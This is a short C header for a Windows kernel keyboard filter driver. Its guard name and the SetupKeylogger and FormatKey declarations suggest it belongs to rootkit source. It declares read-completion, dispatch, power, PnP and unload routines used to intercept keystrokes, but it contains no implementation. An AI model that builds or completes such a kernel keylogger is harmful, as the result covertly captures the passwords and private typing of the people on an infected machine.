#ifndef _H_RK_KEYBOARD_
#define _H_RK_KEYBOARD_

#include <ntddk.h>

#define LCONTROL       ((USHORT)0x1D)
#define CAPS_LOCK      ((USHORT)0x3A)

NTSTATUS KeyboardReadComplete( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context );
NTSTATUS KeyBoardDispatchRead( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp );
NTSTATUS KeyboardPower( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
VOID KeyboardUnload( IN PDRIVER_OBJECT Driver);
NTSTATUS KeyboardPnP( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp );
NTSTATUS KeyboardAddDevice( IN PDRIVER_OBJECT   Driver, IN PDEVICE_OBJECT PDO);
NTSTATUS KeyboardInit(IN PDRIVER_OBJECT DriverObject, PDEVICE_OBJECT *deviceObject);
VOID FormatKey( char data[], char * format, ... );
BOOLEAN SetupKeylogger(PDEVICE_OBJECT deviceObject);


#endif
